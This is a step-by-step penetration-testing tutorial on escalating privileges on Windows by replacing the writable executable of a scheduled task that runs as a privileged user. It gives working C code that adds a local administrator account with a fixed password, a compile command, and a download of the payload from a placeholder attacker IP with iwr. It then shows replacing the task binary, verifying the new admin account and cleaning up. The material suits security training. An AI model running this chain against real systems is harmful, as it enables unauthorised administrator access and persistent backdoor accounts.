## Scheduled Tasks

### Overview
Windows Task Scheduler automates tasks such as updates, cleanup activities, or custom scripts. Each task contains **triggers** (conditions to execute) and **actions** (programs or scripts to run). If a scheduled task:
1. Runs as a privileged user (e.g., `SYSTEM` or `Administrator`), and
2. The specified action points to a writable executable or script,

then it can be abused for **privilege escalation**.

This tutorial will demonstrate how to identify and exploit misconfigured scheduled tasks.

---

### Step 1: Enumerate Scheduled Tasks
To identify tasks that may lead to privilege escalation, run **WinRecon.ps1**:

1. **Option 2**: Run Custom Recon - (Select which functions to enable).
2. **Option 17**: Enumerate scheduled tasks and check for writable executables.

#### Example Output:
```plaintext
===================================================

              Scheduled Tasks Check

===================================================

[+] Task Name: \Microsoft\CacheCleanup
    Author: CLIENTWK220\daveadmin
    Task To Run: C:\Users\steve\Pictures\BackendCacheCleanup.exe
    Run As User: daveadmin
    Status: Ready
    Next Run Time: 2024-06-01 12:00:00 AM
    Permissions: Writable
```

In this example, the scheduled task **\Microsoft\CacheCleanup**:
- Runs as `daveadmin` (a privileged user).
- Executes `BackendCacheCleanup.exe`, located in a writable directory: `C:\Users\steve\Pictures`.
- Runs frequently, as indicated by the **Next Run Time**.

---

### Step 2: Verify Permissions on the Executable
Confirm that you have **Full Control** or **Write** permissions on the executable file specified in the task action:

```powershell
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

**Output Example**:
```plaintext
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(F)
                                                  BUILTIN\Administrators:(F)
                                                  CLIENTWK220\steve:(F)
```

The `(F)` indicates **Full Control**, meaning we can replace the executable.

---

### Step 3: Create a Malicious Executable
The goal is to replace the executable file with a malicious version that creates a local administrator user.

#### Malicious Executable Code
We will use C code to add a user and place them in the Administrators group:

```c
#include <stdlib.h>

int main() {
    system("net user taskmgrsvc Password123! /add");
    system("net localgroup administrators taskmgrsvc /add");
    return 0;
}
```

#### Compile the Executable
On your attacker machine, compile the C code:

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

---

### Step 4: Replace the Scheduled Task Executable
Transfer the malicious executable to the target machine and replace the original task file:

1. Host the file using a Python HTTP server:
   ```bash
   python3 -m http.server 80
   ```
2. On the target machine, download the malicious file:
   ```powershell
iwr -Uri http://<attacker_ip>/adduser.exe -OutFile BackendCacheCleanup.exe
   ```
3. Backup the original executable and replace it:
   ```powershell
   move C:\Users\steve\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
   move .\BackendCacheCleanup.exe C:\Users\steve\Pictures\
   ```
---

### Step 5: Wait for the Task to Execute
The scheduled task will execute automatically based on its trigger. Since this task runs every minute, wait for a short time, then verify that the malicious executable has been executed.

---

### Step 6: Verify Exploitation
Check if the user `taskmgrsvc` has been created and added to the local Administrators group:

1. List all user accounts:
   ```powershell
   net user
   ```
2. Verify the Administrators group:
   ```powershell
   net localgroup administrators
   ```

**Output Example**:
```plaintext
User accounts for \CLIENTWK220
-------------------------------------------------------------------------------
Administrator            taskmgrsvc              DefaultAccount

Alias name     administrators
Members
-------------------------------------------------------------------------------
Administrator
taskmgrsvc
```

The output confirms that the user `taskmgrsvc` was successfully added to the Administrators group.

---

### Step 7: Cleanup
Restore the original executable and clean up any traces of the exploit:

1. Delete the malicious executable:
   ```powershell
   del C:\Users\steve\Pictures\BackendCacheCleanup.exe
   ```
2. Restore the original file:
   ```powershell
   move BackendCacheCleanup.exe.bak C:\Users\steve\Pictures\BackendCacheCleanup.exe
   ```
3. Remove the created user:
   ```powershell
   net user taskmgrsvc /delete
   ```

---

### References
- [HackTricks - Scheduled Tasks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/scheduled-tasks)

---

